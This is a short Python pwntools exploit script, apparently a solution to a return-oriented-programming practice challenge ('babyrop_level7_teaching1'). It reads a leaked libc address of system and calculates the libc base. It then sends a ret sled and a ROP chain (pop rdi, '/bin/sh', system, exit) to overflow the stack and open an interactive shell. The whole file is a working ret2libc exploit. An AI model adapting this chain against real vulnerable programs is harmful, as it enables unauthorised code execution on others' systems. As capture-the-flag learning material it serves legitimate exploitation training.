#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level7_teaching1'
r = ROP(context.binary)
e = ELF('./babyrop_level7_teaching1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = gdb.debug(['./babyrop_level7_teaching1'], 'b *main')
p = process('./babyrop_level7_teaching1')
p.recvuntil(b'is: ')
x = int(p.recvline().strip()[:-1], 16)
log.info('System is @ '+hex(x))
libc.address = x - libc.sym['system']
getGadget = lambda x: p64(r.find_gadget(x).address)
ret = getGadget(['ret'])
exploit = getGadget(['pop rdi', 'ret'])
exploit += p64(next(libc.search(b'/bin/sh')))
exploit += p64(libc.sym["system"])
exploit += p64(libc.sym["exit"])
#one_gadget = 0xe6e73
# exploit = p64(libc.address+one_gadget)
p.sendline((104*ret)+exploit)
p.interactive()